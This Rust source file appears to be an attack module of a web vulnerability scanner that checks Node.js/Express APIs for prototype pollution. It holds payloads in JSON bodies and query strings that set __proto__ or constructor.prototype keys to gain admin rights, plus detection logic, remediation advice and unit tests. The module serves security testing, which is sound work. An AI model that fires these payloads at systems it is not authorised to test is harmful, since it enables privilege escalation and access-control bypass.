use async_trait::async_trait;

use nevelio_core::types::{Endpoint, Finding, Severity};
use nevelio_core::{AttackModule, HttpClient, ScanSession};

// ---------------------------------------------------------------------------
// Prototype Pollution payloads
// ---------------------------------------------------------------------------

const PROTO_JSON_PAYLOADS: &[&str] = &[
    r#"{"__proto__":{"admin":true}}"#,
    r#"{"constructor":{"prototype":{"admin":true}}}"#,
    r#"{"__proto__":{"isAdmin":true,"role":"admin"}}"#,
    r#"{"__proto__":{"isAuthenticated":true}}"#,
    r#"{"constructor":{"prototype":{"isAdmin":true}}}"#,
];

const PROTO_QUERY_PAYLOADS: &[(&str, &str)] = &[
    ("__proto__[admin]", "true"),
    ("__proto__[isAdmin]", "true"),
    ("__proto__[role]", "admin"),
    ("constructor[prototype][admin]", "true"),
    ("constructor[prototype][role]", "admin"),
];

// Indicators that suggest prototype pollution took effect
const POLLUTION_INDICATORS: &[&str] = &[
    "\"admin\":true",
    "\"isAdmin\":true",
    "\"role\":\"admin\"",
    "\"isAuthenticated\":true",
];

// Node.js/Express detection indicators in response headers/body
const NODEJS_INDICATORS: &[&str] = &["express", "node.js", "nodejs", "node/"];

// ---------------------------------------------------------------------------
// Module
// ---------------------------------------------------------------------------

pub struct PrototypePollutionModule;

#[async_trait]
impl AttackModule for PrototypePollutionModule {
    fn name(&self) -> &str {
        "prototype-pollution"
    }

    fn description(&self) -> &str {
        "Détecte la Prototype Pollution via JSON body et query string (APIs Node.js/Express)"
    }

    async fn run(
        &self,
        _session: &ScanSession,
        client: &HttpClient,
        endpoints: &[Endpoint],
    ) -> Vec<Finding> {
        let mut findings = Vec::new();

        for ep in endpoints {
            // Only probe endpoints that look like Node.js/Express
            let is_node = detect_nodejs(client, ep).await;

            // JSON body injection — POST/PUT/PATCH only
            if matches!(ep.method.as_str(), "POST" | "PUT" | "PATCH") {
                findings.extend(check_proto_json(client, ep, is_node).await);
            }

            // Query string injection — GET endpoints
            if ep.method == "GET" {
                findings.extend(check_proto_query(client, ep, is_node).await);
            }
        }

        findings
    }
}

// ---------------------------------------------------------------------------
// Node.js detection
// ---------------------------------------------------------------------------

async fn detect_nodejs(client: &HttpClient, ep: &Endpoint) -> bool {
    let Ok(req) = client
        .inner()
        .request(
            ep.method.parse().unwrap_or(reqwest::Method::GET),
            &ep.full_url,
        )
        .build()
    else {
        return false;
    };

    let Ok(resp) = client.send(req).await else {
        return false;
    };

    // Check response headers
    let powered_by = resp
        .headers()
        .get("x-powered-by")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_lowercase();

    let server = resp
        .headers()
        .get("server")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_lowercase();

    NODEJS_INDICATORS
        .iter()
        .any(|i| powered_by.contains(i) || server.contains(i))
}

// ---------------------------------------------------------------------------
// Check: Prototype Pollution via JSON body
// ---------------------------------------------------------------------------

async fn check_proto_json(client: &HttpClient, ep: &Endpoint, is_node: bool) -> Vec<Finding> {
    // Baseline
    let Ok(baseline_req) = client
        .inner()
        .request(
            ep.method.parse().unwrap_or(reqwest::Method::POST),
            &ep.full_url,
        )
        .header("Content-Type", "application/json")
        .body("{}")
        .build()
    else {
        return vec![];
    };
    let baseline_resp = client.send(baseline_req).await.ok();
    let baseline_body = match baseline_resp {
        Some(r) => r.text().await.unwrap_or_default(),
        None => return vec![],
    };

    for payload in PROTO_JSON_PAYLOADS {
        let method: reqwest::Method = ep.method.parse().unwrap_or(reqwest::Method::POST);
        let Ok(req) = client
            .inner()
            .request(method, &ep.full_url)
            .header("Content-Type", "application/json")
            .body(*payload)
            .build()
        else {
            continue;
        };

        let Ok(resp) = client.send(req).await else {
            continue;
        };
        let status = resp.status().as_u16();
        let body = resp.text().await.unwrap_or_default();

        let pollution_detected = POLLUTION_INDICATORS.iter().any(|i| body.contains(i))
            && !baseline_body.contains(POLLUTION_INDICATORS[0]);

        if matches!(status, 200..=299)
            && (pollution_detected || body.len() > baseline_body.len() + 100)
        {
            return vec![build_finding(
                ep,
                payload,
                status,
                &body,
                "JSON body",
                is_node,
            )];
        }
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Check: Prototype Pollution via query string
// ---------------------------------------------------------------------------

async fn check_proto_query(client: &HttpClient, ep: &Endpoint, is_node: bool) -> Vec<Finding> {
    for (proto_key, proto_val) in PROTO_QUERY_PAYLOADS {
        let sep = if ep.full_url.contains('?') { '&' } else { '?' };
        let url = format!("{}{}{}={}", ep.full_url, sep, proto_key, proto_val);

        let Ok(req) = client.inner().get(&url).build() else {
            continue;
        };
        let Ok(resp) = client.send(req).await else {
            continue;
        };

        let status = resp.status().as_u16();
        let body = resp.text().await.unwrap_or_default();

        // Detect if the pollution indicator appears in the response (server-reflected pollution)
        let pollution_detected = POLLUTION_INDICATORS.iter().any(|i| body.contains(i));

        if matches!(status, 200..=299) && pollution_detected {
            let payload_str = format!("?{}={}", proto_key, proto_val);
            return vec![build_finding(
                ep,
                &payload_str,
                status,
                &body,
                "query string",
                is_node,
            )];
        }
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn build_finding(
    ep: &Endpoint,
    payload: &str,
    status: u16,
    body: &str,
    injection_point: &str,
    is_confirmed_node: bool,
) -> Finding {
    let confidence = if is_confirmed_node {
        "Confirmé (Node.js/Express)"
    } else {
        "Possible"
    };
    let mut f = Finding::new(
        format!(
            "Prototype Pollution — {} ({}) via {}",
            ep.path, confidence, injection_point
        ),
        Severity::High,
        7.5,
        "prototype-pollution".to_string(),
        ep.full_url.clone(),
        ep.method.clone(),
    );
    f.description = format!(
        "L'endpoint {} semble vulnérable à la Prototype Pollution via {}. \
         Un payload ciblant `__proto__` ou `constructor.prototype` a produit une réponse \
         anormale (HTTP {}). Un attaquant peut modifier le prototype global de JavaScript \
         pour s'octroyer des droits admin ou contourner des contrôles d'accès.",
        ep.full_url, injection_point, status
    );
    f.proof = format!(
        "Payload: {}\nRéponse HTTP {}: {}",
        payload,
        status,
        body.chars().take(300).collect::<String>()
    );
    f.recommendation =
        "Utiliser `Object.freeze(Object.prototype)` ou un schema de validation strict. \
         Filtrer les clés `__proto__`, `constructor`, `prototype` dans toutes les entrées JSON. \
         Utiliser `Object.create(null)` pour les maps sans prototype."
            .to_string();
    f.cwe = Some("CWE-1321".to_string());
    f.references = vec![
        "https://portswigger.net/web-security/prototype-pollution".to_string(),
        "https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html".to_string(),
    ];
    f
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn proto_json_payloads_non_empty() {
        assert!(!PROTO_JSON_PAYLOADS.is_empty());
        assert!(PROTO_JSON_PAYLOADS.iter().any(|p| p.contains("__proto__")));
    }

    #[test]
    fn proto_query_payloads_non_empty() {
        assert!(!PROTO_QUERY_PAYLOADS.is_empty());
        assert!(PROTO_QUERY_PAYLOADS
            .iter()
            .any(|(k, _)| k.contains("__proto__")));
    }

    #[test]
    fn pollution_indicators_cover_admin() {
        assert!(POLLUTION_INDICATORS.iter().any(|i| i.contains("admin")));
    }

    #[test]
    fn module_name_and_description() {
        let m = PrototypePollutionModule;
        assert_eq!(m.name(), "prototype-pollution");
        assert!(!m.description().is_empty());
    }
}
